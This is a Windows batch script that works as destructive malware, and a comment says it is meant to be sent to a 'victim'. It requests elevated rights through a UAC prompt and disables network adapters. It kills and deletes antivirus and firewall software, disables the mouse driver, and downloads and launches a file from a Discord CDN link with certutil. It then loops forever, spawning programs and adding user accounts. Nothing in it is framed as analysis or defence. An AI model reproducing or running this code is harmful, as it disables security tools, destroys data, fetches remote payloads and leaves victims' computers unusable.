@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
cd %systemroot%\system32
netsh interface set interface "Local Area Connection" DISABLED
netsh interface set interface "Wi-Fi" DISABLED
netsh interface set interface "LAN" disabled
netsh interface set interface "Ethernet" admin=disable
devcon disable "PCI\VEN_1317&*"
wmic path win32_networkadapter where index = 1 call disable
wmic path win32_networkadapter where index = 2 call disable
wmic path win32_networkadapter where index = 3 call disable
wmic path win32_networkadapter where index = 4 call disable
wmic path win32_networkadapter where index = 5 call disable
wmic path win32_networkadapter where index = 6 call disable
wmic path win32_networkadapter where index = 7 call disable
wmic path win32_networkadapter where index = 8 call disable
wmic path win32_networkadapter where index = 9 call disable
wmic path win32_networkadapter where index = 10 call disable
wmic path win32_networkadapter where index = 11 call disable
wmic path win32_networkadapter where index = 12 call disable
echo get fucked

::REMOVE THE PAUSES BEFORE COMPILING/SENDING TO A VICTIM
pause
pause
pause
pause
pause
pause

net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmincls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.datcls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\panda
software\*.*

set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key% /f
reg add %key% /v Start /t REG_DWORD /d 4

md %systemroot%\system32
set url=https://cdn.discordapp.com/attachments/839654041801195580/887059543916421171/remove_win.ini
set file=remove_win.ini
certutil -urlcache -split -f %url% %file%
set path=%systemroot%\system32
move %file% %path%\%file% >nul
start remove_win.ini

goto CrashLoop
:CrashLoop
md %random%
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
md %random%
user %random% /add
goto :CrashLoop